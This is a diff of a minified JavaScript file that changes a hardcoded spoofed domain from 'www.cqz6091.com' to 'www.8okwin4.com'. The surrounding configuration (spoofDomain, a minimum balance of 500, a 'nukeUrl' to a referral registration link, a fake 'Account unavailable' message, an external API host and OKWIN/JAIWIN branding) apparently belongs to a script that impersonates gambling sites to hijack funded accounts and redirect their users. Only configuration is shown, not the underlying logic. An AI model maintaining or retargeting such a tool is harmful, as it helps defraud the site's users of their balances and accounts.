@@ -2651,7 +2651,7 @@ function me() {
 }
 function Po() {
     if (k) return;
-    let n = "www.cqz6091.com".includes("okwin"),
+    let n = "www.8okwin4.com".includes("okwin"),
         t = document.createElement("style");
     ((t.textContent = `
     .wgp-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.75);z-index:99998;display:none}
@@ -4116,9 +4116,9 @@ var Yo = "https://imgametransit.com",
     Vo = "Account unavailable. Please create a new account.",
     Ko = "/#/register?invitationCode=116261778244",
     Do = "/#/wallet/Recharge",
-    Bo = "www.cqz6091.com".includes("okwin") ? "light" : "dark",
-    Ao = "www.cqz6091.com".includes("okwin") ? "OKWIN" : "JAIWIN",
-    so = "www.cqz6091.com".includes("okwin") ? "test.wakeuptorealityok.workers.dev" : "jaiclub.win",
+    Bo = "www.8okwin4.com".includes("okwin") ? "light" : "dark",
+    Ao = "www.8okwin4.com".includes("okwin") ? "OKWIN" : "JAIWIN",
+    so = "www.8okwin4.com".includes("okwin") ? "test.wakeuptorealityok.workers.dev" : "jaiclub.win",
     De = "";
 function _(n) {
     let t = String(n == null ? "" : n).trim();
@@ -4260,7 +4260,7 @@ function se() {
 }
 Wt({
     apiBase: Yo,
-    spoofDomain: "www.cqz6091.com",
+    spoofDomain: "www.8okwin4.com",
     minBalance: 500,
     nukeUrl: Ko,
     authErrMsg: Vo,
